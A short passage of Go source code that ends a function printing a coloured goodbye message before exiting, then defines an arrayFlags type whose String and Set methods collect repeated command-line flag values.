    fmt.Println(Blue+"        BYE BYE <3                     "+ Reset)
    os.Exit(0)
}


type arrayFlags []string

func (i *arrayFlags) String() string {
    return "arrayFlags"
}

func (i *arrayFlags) Set(value string) error {
    *i = append(*i, value)
    return nil
}